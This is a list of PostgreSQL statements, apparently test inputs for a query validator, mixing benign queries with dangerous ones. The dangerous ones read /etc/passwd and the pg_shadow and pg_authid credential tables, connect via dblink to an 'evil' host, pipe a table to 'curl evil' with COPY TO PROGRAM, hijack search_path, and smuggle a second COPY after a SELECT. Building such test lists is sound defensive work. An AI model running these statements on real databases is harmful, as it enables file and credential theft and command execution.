SELECT pg_sleep(10)
SELECT pg_sleep(10) FROM public.orders
SELECT pg_read_file('/etc/passwd')
SELECT pg_read_binary_file('/etc/passwd')
SELECT pg_ls_dir('/')
SELECT lo_import('/etc/passwd')
SELECT lo_export(1, '/tmp/x')
SELECT dblink('host=evil', 'select 1')
SELECT * FROM dblink('host=evil', 'select 1') AS t(x int)
SELECT nextval('seq')
SELECT setval('seq', 1)
SELECT currval('seq')
SELECT set_config('search_path', 'evil', false)
SELECT current_setting('x')
SELECT pg_terminate_backend(1)
SELECT pg_cancel_backend(1)
SELECT pg_advisory_lock(1)
SELECT query_to_xml('delete from t', true, false, '')
SELECT xpath('/a', '<a/>'::xml)
SELECT * FROM pg_catalog.pg_user
SELECT * FROM pg_catalog.pg_shadow
SELECT * FROM information_schema.tables
SELECT * FROM public.pg_stat_activity
SELECT * FROM pg_roles
SELECT * FROM pg_authid
SELECT * FROM public.orders WHERE id = ANY(ARRAY[1,2])
SELECT * FROM public.orders WHERE data @> '{}'::jsonb
COPY public.orders TO PROGRAM 'curl evil'
COPY (SELECT 1) TO '/tmp/x'
DO $$ BEGIN PERFORM 1; END $$
SELECT * FROM public.orders WHERE id = 1; COPY public.orders TO '/tmp/x'
SELECT * FROM public.orders RETURNING id
SELECT version()
SELECT current_user
SELECT session_user
